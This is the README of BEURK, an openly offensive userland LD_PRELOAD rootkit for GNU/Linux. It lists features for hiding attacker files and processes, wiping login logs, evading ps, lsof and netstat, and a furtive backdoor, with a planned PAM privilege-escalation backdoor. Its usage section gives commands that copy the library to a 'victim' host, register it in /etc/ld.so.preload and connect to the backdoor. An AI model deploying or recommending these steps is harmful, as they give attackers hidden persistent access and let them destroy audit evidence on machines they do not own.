BEURK
=====
[Getting Started] | [API Documentation] | [Contributing] | [TODO List]

[![Travis Build][Travis badge]](https://travis-ci.org/unix-thrust/beurk)
[![Ready Issues][Waffle badge]](https://waffle.io/unix-thrust/beurk)
[![Coverage Status][Cover badge]](https://coveralls.io/r/unix-thrust/beurk)
[![Jenkins Build][Jenkins badge]](http://ci.zgun-family.eu/job/BEURK/)
[![Join the chat at https://gitter.im/unix-thrust/beurk](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/unix-thrust/beurk)

**BEURK** is an userland [preload rootkit] for GNU/Linux, heavily focused
around anti-debugging and anti-detection.

> _**S'ils savaient, ils vomiraient ...**_
>
> *- The core team -*


-------------------------------------------------------------------------------

### Features ###
- Hide attacker files and directories
- Realtime log cleanup (on [utmp/wtmp])
- Anti process and login detection
- Bypass unhide, lsof, ps, ldd, netstat analysis
- Furtive PTY backdoor client

### Upcoming features ###
- [ptrace(2)] hooking for anti-debugging
- [libpcap] hooking undermines local sniffers
- PAM backdoor for *local privilege escalation*

### Usage ###
* **Compile**
```sh
    git clone https://github.com/unix-thrust/beurk.git
    cd beurk
    make
```
* **Install**
```sh
    scp libselinux.so root@victim.com:/lib/
    ssh root@victim.com 'echo /lib/libselinux.so >> /etc/ld.so.preload'
```
* **Enjoy !**
```sh
    ./client.py victim_ip:port # connect with furtive backdoor
```

### Dependencies ###

The following packages are not required in order to build BEURK at the moment:

* **libpcap** - to avoid local sniffing
* **libpam** - for local PAM backdoor
* **libssl** - for encrypted backdoor connection

**Example on debian:**
```sh
    apt-get install libpcap-dev libpam-dev libssl-dev
```

-------------------------------------------------------------------------------

[![Waffle metrics][Waffle metrics]](https://waffle.io/unix-thrust/beurk/metrics)

* _**BEURK v 1.0 is in active development,**_
_**please checkout current [development branch].**_

> NOTE: **BEURK** is a recursive acronym for
> **B**EURK **E**xperimental **U**nix **R**oot **K**it

-------------------------------------------------------------------------------

[Getting Started]: https://github.com/unix-thrust/beurk/wiki
[API Documentation]: https://github.com/unix-thrust/beurk/wiki/API-Documentation
[TODO List]: https://github.com/unix-thrust/beurk/blob/master/TODO.md
[Contributing]: https://github.com/unix-thrust/beurk/blob/master/CONTRIBUTING.md

[Travis badge]: https://travis-ci.org/unix-thrust/beurk.svg?branch=master
[Waffle badge]: https://badge.waffle.io/unix-thrust/beurk.svg?label=Ready&title=Ready-Issues
[Cover badge]: https://img.shields.io/coveralls/unix-thrust/beurk.svg
[Jenkins badge]: http://ci.zgun-family.eu/job/BEURK/badge/icon
[Waffle metrics]: https://graphs.waffle.io/unix-thrust/beurk/throughput.svg

[preload rootkit]: http://volatility-labs.blogspot.fr/2012/09/movp-24-analyzing-jynx-rootkit-and.html
[utmp/wtmp]: http://man7.org/linux/man-pages/man5/utmp.5.html
[ptrace(2)]: http://man7.org/linux/man-pages/man2/ptrace.2.html
[libpcap]: http://en.wikipedia.org/wiki/Pcap#libpcap
[development branch]: https://github.com/unix-thrust/beurk/tree/dev
